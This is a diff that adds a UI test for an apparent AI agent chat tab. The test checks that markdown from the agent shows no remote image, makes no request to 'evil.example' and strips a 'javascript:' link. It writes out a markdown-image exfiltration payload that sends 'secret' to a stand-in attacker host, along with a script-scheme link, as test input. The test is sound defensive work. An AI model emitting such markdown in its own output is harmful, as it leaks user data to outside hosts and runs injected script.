@@ -177,4 +177,25 @@ describe('the Agent tab', () => {
     expect(box.querySelector('script')).toBeNull();
     expect(box).not.toHaveTextContent('**');
   });
+
+  it('draws no remote image from agent markdown and makes no request for it', async () => {
+    const { server } = await start();
+    const loaded: string[] = [];
+    const original = HTMLImageElement.prototype.setAttribute;
+    HTMLImageElement.prototype.setAttribute = function (name: string, value: string) {
+      if (name === 'src') loaded.push(value);
+      return original.call(this, name, value);
+    };
+    try {
+      await say(server, { kind: 'message', text: 'Look: ![x](https://evil.example/?q=secret) and [a link](javascript:alert(1)) and [ok](https://example.com)' });
+      const box = await screen.findByTestId('chat-agent');
+      await waitFor(() => expect(box).toHaveTextContent('Look:'));
+      expect(box.querySelector('img')).toBeNull();
+      expect(box.innerHTML).not.toContain('evil.example');
+      expect(box.innerHTML).not.toContain('javascript:');
+      expect(loaded.filter((src) => src.includes('evil.example'))).toEqual([]);
+    } finally {
+      HTMLImageElement.prototype.setAttribute = original;
+    }
+  });
 });
